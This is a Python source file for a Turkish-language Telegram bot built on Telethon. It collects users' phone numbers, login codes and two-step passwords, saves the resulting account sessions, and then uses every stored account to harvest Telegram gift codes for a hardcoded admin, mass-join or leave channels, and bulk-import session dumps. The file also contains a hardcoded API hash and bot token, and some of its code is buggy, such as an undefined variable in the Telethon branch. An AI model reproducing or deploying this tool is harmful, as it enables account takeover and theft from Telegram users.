import zipfile
import os
try:
    from telethon.sessions import StringSession
    import asyncio, re, json, shutil
    from kvsqlite.sync import Client as uu
    from telethon.tl.types import KeyboardButtonUrl
    from telethon.tl.types import KeyboardButton, ReplyInlineMarkup
    from telethon import TelegramClient, events, functions, types, Button
    from telethon.tl.types import DocumentAttributeFilename
    from plugins.converter import MangSession
    import time, datetime, random 
    from datetime import timedelta
    from telethon.errors import (
        ApiIdInvalidError,
        PhoneNumberInvalidError,
        PhoneCodeInvalidError,
        PhoneCodeExpiredError,
        SessionPasswordNeededError,
        PasswordHashInvalidError
    )
    from plugins import *
    from plugins.messages import *
    from plugins.get_gift import *
except:
    os.system("pip install telethon kvsqlite")
    try:
        from telethon.sessions import StringSession
        import asyncio, re, json, shutil
        from kvsqlite.sync import Client as uu
        from telethon.tl.types import KeyboardButtonUrl
        from telethon.tl.types import KeyboardButton
        from telethon import TelegramClient, events, functions, types, Button
        from telethon.tl.types import DocumentAttributeFilename
        from plugins.converter import MangSession
        import time, datetime, random 
        from datetime import timedelta
        from telethon.errors import (
            ApiIdInvalidError,
            PhoneNumberInvalidError,
            PhoneCodeInvalidError,
            PhoneCodeExpiredError,
            SessionPasswordNeededError,
            PasswordHashInvalidError
        )
        from plugins import *
        from plugins.messages import *
        from plugins.get_gift import *
    except Exception as errors:
        print('Bir hata oluştu: ' + str(errors))
        exit(0)

        
if not os.path.isdir('veritabanı'):
    os.mkdir('veritabanı')

API_ID = "21871272"
API_HASH = "57efa4949cd41dccd628c04b8507ff2b"
admin ='12563655354'

# Botunuzun token'i ile değiştirin
token = "6776395463:AAH2z5apFePZmHlllaePmlttntf4EhExWqg"
client = TelegramClient('ses', API_ID, API_HASH)
client.start()
bot = client

# Veritabanını oluştur
db = uu('veritabanı/elhakem.ss', 'bot')

if not db.exists("hesaplar"):
    db.set("hesaplar", [])

if not db.exists("kötü_adamlar"):
    db.set("kötü_adamlar", [])

if not db.exists("zorla"):
   db.set("zorla", [])
      
@client.on(events.NewMessage(pattern="/başla", func = lambda x: x.is_private))
async def başla(event):
    user_id = event.chat_id
    bans = db.get('kötü_adamlar') if db.exists('kötü_adamlar') else []
    async with bot.conversation(event.chat_id) as x:
        buttons = [
            [
                Button.inline("Hesap Ekle", data="ekle"),
                Button.inline("Hediyeleri Al", data="hediye_al"),
            ],
            [
                Button.inline("Kanala Katıl", data="kanala_katıl"),
                Button.inline("Kanalı Terk Et", data="kanaldan_ayrıl"),
            ],
            [
                Button.inline("Pyrogram Oturumu Kaydet", data="pyrogram"),
                Button.inline("Telethon Oturumu Kaydet", data="telethon"),
            ],
            [
                Button.inline("Yedekle", data="hepsini_ziple"),
                Button.inline("Oturumu Al", data="oturum_al"),
            ],
            [
                Button.inline("Botun Hesap Sayısı", data="hesap_sayısı"),
            ],
            [
                Button.inline("Hesapları Temizle", data="kontrol"),
                Button.inline("Tüm Kanalları Terk Et", data="hepsinden_ayrıl"),
            ],
        ]
        await event.reply("**- Hesaplarınızdan Özel Bağlantıları Getiren Bot'a Hoş Geldiniz 🔗**\n\n- Aşağıdaki düğmelerden yapmak istediğiniz işlemi seçin.", buttons=buttons)
        
        
        
@client.on(events.callbackquery.CallbackQuery())
async def başla_dinle(event):
    data = event.data.decode('utf-8')
    user_id = event.chat_id
    if data == "pyrogram":
        async with bot.conversation(event.chat_id) as x:
            await x.send_message("- Şimdi Pyrogram oturumunu gönderin")
            txt = await x.get_response()
            session = txt.text
            try:
                Convert_sess = MangSession.PYROGRAM_TO_TELETHON(session)
            except:
                return await x.send_message("- Lütfen doğru biçimde Pyrogram oturumunu gönderin")
            data = {"phone_number": "Tanınmadı", "two-step": "Yok", "session": Convert_sess}
            acc = db.get("hesaplar")
            acc.append(data)
            db.set("hesaplar", acc)
            with open('oturum.txt', 'w') as file:
                file.write(str(session) + '\n')
            await x.send_message("- Oturum başarıyla kaydedildi ✅")
    
    if data == "telethon":
        async with bot.conversation(event.chat_id) as x:
            await x.send_message("- Şimdi Telethon oturumunu gönderin")
            txt = await x.get_response()
            session = txt.text
            data = {"phone_number": "Tanınmadı", "two-step": "Yok", "session": Convert_sess}
            acc = db.get("hesaplar")
            acc.append(data)
            db.set("hesaplar", acc)
            with open('oturum.txt', 'w') as file:
                file.write(str(session) + '\n')
            await x.send_message("- Oturum başarıyla kaydedildi ✅")
            
    if data == "geri" or data == "iptal":
        buttons = [
            [
                Button.inline("Hesap Ekle", data="ekle"),
                Button.inline("Hediyeleri Al", data="hediye_al"),
            ],
            [
                Button.inline("Kanala Katıl", data="kanala_katıl"),
                Button.inline("Kanalı Terk Et", data="kanaldan_ayrıl"),
            ],
            [
                Button.inline("Pyrogram Oturumu Kaydet", data="pyrogram"),
                Button.inline("Telethon Oturumu Kaydet", data="telethon"),
            ],
            [
                Button.inline("Yedekle", data="hepsini_ziple"),
                Button.inline("Oturumu Al", data="oturum_al"),
            ],
            [
                Button.inline("Botun Hesap Sayısı", data="hesap_sayısı"),
            ],
            [
                Button.inline("Hesapları Temizle", data="kontrol"),
                Button.inline("Tüm Kanalları Terk Et", data="hepsinden_ayrıl"),
            ],
        ]
        await event.edit("**- Hesaplarınızdan Özel Bağlantıları Getiren Bot'a Hoş Geldiniz 🔗**\n\n- Aşağıdaki düğmelerden yapmak istediğiniz işlemi seçin.", buttons=buttons)
    if data == "ekle":
        async with bot.conversation(event.chat_id) as x:
            await x.send_message("✔️Şimdi telefon numaranızı ve ülke kodunuzu gönderin, örneğin: +201000000000")
            txt = await x.get_response()
            phone_number = txt.text.replace("+", "").replace(" ", "")
            app = TelegramClient(StringSession(), API_ID, API_HASH)
            await app.connect()
            password=None
            try:
                code = await app.send_code_request(phone_number)
            except (ApiIdInvalidError):
                await x.send_message("**API_ID** ve **API_HASH** kombinasyonunuz Telegram API sistemine uymuyor.")
                return
            except (PhoneNumberInvalidError):
                await x.send_message("**Gönderdiğiniz telefon numarası** herhangi bir Telegram hesabına ait değil.")
                return
            await x.send_message("- Doğrulama kodunuz hesabınıza gönderildi.\n\n- Lütfen kodu aşağıdaki formatta gönderin: 1 2 3 4 5")
            txt = await x.get_response()
            code = txt.text.replace(" ", "")
            try:
                await app.sign_in(phone_number, code, password=None)
                string_session = app.session.save()
                data = {"phone_number": phone_number, "two-step": "Yok", "session": string_session}
                accounts = db.get("hesaplar")
                accounts.append(data)
                db.set("hesaplar", accounts)
                await x.send_message("- Hesap başarıyla kaydedildi ✅")
            except (PhoneCodeInvalidError):
                await x.send_message("**Gönderdiğiniz OTP** yanlış.")
                return
            except (PhoneCodeExpiredError):
                await x.send_message("**Gönderdiğiniz OTP** süresi dolmuş.")
                return
            except (SessionPasswordNeededError):
                await x.send_message("- Lütfen iki adımlı doğrulama kodunuzu gönderin")
                txt = await x.get_response()
                password = txt.text
                try:
                    await app.sign_in(password=password)
                except (PasswordHashInvalidError):
                    await x.send_message("**Gönderdiğiniz şifre** yanlış.")
                    return
                string_session = app.session.save()
                data = {"phone_number": phone_number, "two-step": password, "session": string_session}
                accounts = db.get("hesaplar")
                accounts.append(data)
                db.set("hesaplar", accounts)
                await x.send_message("- Hesap başarıyla kaydedildi ✅")
    if data == "hesap_sayısı":
        acc = db.get("hesaplar")
        await event.answer(f"- Kayıtlı hesap sayısı: {len(acc)}", alert=True)
    if data == "hediye_al":
        await event.answer(f"- Hesaplardan hediyeler alınmaya başlandı, lütfen bildirimi bekleyin", alert=True)
        acc = db.get("hesaplar")
        count = 0
        for i in acc:
            x = await get_gift(i["session"])
            if x != False:
                text = f"**• Yeni bir Telegram hediye bağlantısı 🥳**\n\n- Bağlantı: https://t.me/giftcode/{x}\n- Telefon numarası: `{i['phone_number']}`"
                count += 1
                await client.send_message(admin, text)
        await client.send_message(admin, f"- Hesaplar kontrol edildi, {count} bağlantı bulundu")
    if data == "kanala_katıl":
        async with bot.conversation(event.chat_id) as x:
            await x.send_message("- Şimdi tüm hesapları belirtilen kanala katmak için bağlantıyı veya kanal kimliğini gönderin")
            ch = await x.get_response()
            if "@" not in ch.text:
                if "/t.me/" not in ch.text:
                    await x.send_message(f"- Lütfen bağlantıyı veya kanal kimliğini doğru formatta gönderin")
                    return 
            channel = ch.text.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
            acc = db.get("hesaplar")
            true, false = 0, 0
            await x.send_message(f"- {len(acc)} hesaptan katılmaya başlandı")
            for i in acc:
                xx = await join_channel(i["session"], channel)
                if xx is True:
                    true += 1
                else:
                    false += 1
            await x.send_message(f"**- İşleminiz başarıyla tamamlandı ✅**\n\n- Başarılı: {true}\n- Başarısız: {false}")
    if data == "kanaldan_ayrıl":
        async with bot.conversation(event.chat_id) as x:
            await x.send_message("- Şimdi tüm hesapları belirtilen kanaldan çıkmak için bağlantıyı veya kanal kimliğini gönderin")
            ch = await x.get_response()
            if "@" not in ch.text:
                if "/t.me/" not in ch.text:
                    await x.send_message(f"- Lütfen bağlantıyı veya kanal kimliğini doğru formatta gönderin")
                    return 
            channel = ch.text.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
            acc = db.get("hesaplar")
            true, false = 0, 0
            await x.send_message(f"- {len(acc)} hesaptan ayrılmaya başlandı")
            for i in acc:
                xx = await leave_channel(i["session"], channel)
                if xx is True:
                    true += 1
                else:
                    false += 1
            await x.send_message(f"**- İşleminiz başarıyla tamamlandı ✅**\n\n- Başarılı: {true}\n- Başarısız: {false}")
    if data == 'hepsini_ziple':
        folder_path = f"./database"
        zip_file_name = f"database.zip"
        zip_file_nam = f"database"
        try:
            shutil.make_archive(zip_file_nam, 'zip', folder_path)
            with open(zip_file_name, 'rb') as zip_file:
                await client.send_file(user_id, zip_file, attributes=[DocumentAttributeFilename(file_name="database.zip")])
            os.remove(zip_file_name)
        except Exception as a:
            print(a)
    if data == "hepsinden_ayrıl":
        buttons = [
            [
                Button.inline("Onayla ✅", data="hepsinden_ayrıl_kanallar"),
                Button.inline("İptal ❌", data="iptal"),
            ]
        ]
        await event.edit("**- Tüm hesaplardan kanalları terk etmek istediğinize emin misiniz?**", buttons=buttons)
    if data == "hepsinden_ayrıl_kanallar":
        async with bot.conversation(event.chat_id) as x:
            acc = db.get("hesaplar")
            await event.edit(f"**- {len(acc)} hesaptan kanalları terk etmeye başlandı, tamamlandığında bildirim alacaksınız **")
            true, false = 0, 0
            await x.send_message(f"- {len(acc)} hesaptan kanalları terk etmeye başlandı")
            for i in acc:
                xx = await leave_all(i["session"])
                if xx is True:
                    true += 1
                else:
                    false += 1
            await x.send_message(f"**- İşleminiz başarıyla tamamlandı ✅**\n\n- Başarılı: {true}\n- Başarısız: {false}")
    
    if data == "kontrol":
        buttons = [
            [
                Button.inline("Onayla ✅", data="hesapları_kontrol_et"),
                Button.inline("İptal ❌", data="iptal"),
            ]
        ]
        await event.edit("**- Tüm hesapları kontrol etmek istediğinize emin misiniz?**", buttons=buttons)
    if data == "hesapları_kontrol_et":
        async with bot.conversation(event.chat_id) as x:
            acc = db.get("hesaplar")
            await event.edit(f"**- {len(acc)} hesap kontrol edilmeye başlandı, tamamlandığında bildirim alacaksınız **")
            true, false = 0, 0
            await x.send_message(f"- {len(acc)} hesap kontrol edilmeye başlandı")
            for i in acc:
                Convert_sess = MangSession.TELETHON_TO_PYROGRAM(i["session"])
                xx = await check(Convert_sess, client, user_id)
                if xx is True:
                    true += 1
                else:
                    false += 1
                    acc.remove(i)
                    db.set("hesaplar", acc)
                await event.edit(f"**- Hesaplar kontrol ediliyor 📂**\n\n- Çalışan hesaplar: {true}\n- Silinen hesaplar: {false}")
                
            await x.send_message(f"**- İşleminiz başarıyla tamamlandı ✅**\n\n- Çalışan hesaplar: {true}\n- Silinen hesaplar: {false}")
    if data == "oturum_al":
        async with bot.conversation(event.chat_id) as x:
            await x.send_message("- Lütfen bot için kaydettiğiniz telefon numarasını gönderin")
            txt = await x.get_response()
            phone_number = txt.text.replace("+", "").replace(" ", "")
            acc = db.get("hesaplar")
            for i in acc:
                if phone_number == i['phone_number']:
                    text = f"• Telefon numarası: {phone_number}\n\n- İki Adımlı Doğrulama: {i['two-step']}\n\n- Oturum: `{i['session']}"
                    await x.send_message(text)
                    return
            await x.send_message("- Bu numara hesaplar listesinde bulunamadı")
            
@client.on(events.NewMessage())
async def handle_zip_file(event):
    async with bot.conversation(event.chat_id) as x:
        try:
            if event.media and event.media.document:
                message = event.message
                file = await message.download_media()

                if not os.path.exists('olddata'):
                    os.makedirs('olddata')

                with zipfile.ZipFile(file, 'r') as zip_ref:
                    zip_ref.extractall('olddata')
                    
                os.remove(file)
                await x.send_message('Dosya başarıyla açıldı ve "olddata" klasörüne konuldu.')
                olddb = uu('olddata/data.sqlite', 'eski')
                accs = db.get("hesaplar")
                if olddb.exists("sessions") and len(olddb.get("sessions")) > 0:
                    for i in olddb.get("sessions"):
                        Convert_sess = MangSession.PYROGRAM_TO_TELETHON(i)
                        data = {"phone_number": "Tanımlanamadı", "two-step": "Yok", "session": Convert_sess}
                        if data not in accs:
                            accs.append(data)
                            db.set("hesaplar", accs)
                    await x.send_message(f'{len(olddb.get("sessions"))} hesap başarıyla eklendi.')
                else: 
                    await x.send_message(f'• Bu depoda herhangi bir numara yok.')
        except Exception as e:
            await x.send_message(f'Zipten çıkarılırken bir sorun oluştu: {str(e)}')
        
client.run_until_disconnected()

#by @polatalemdar330
#channel: https://t.me/polatalemdar330
#in 06/02/2024
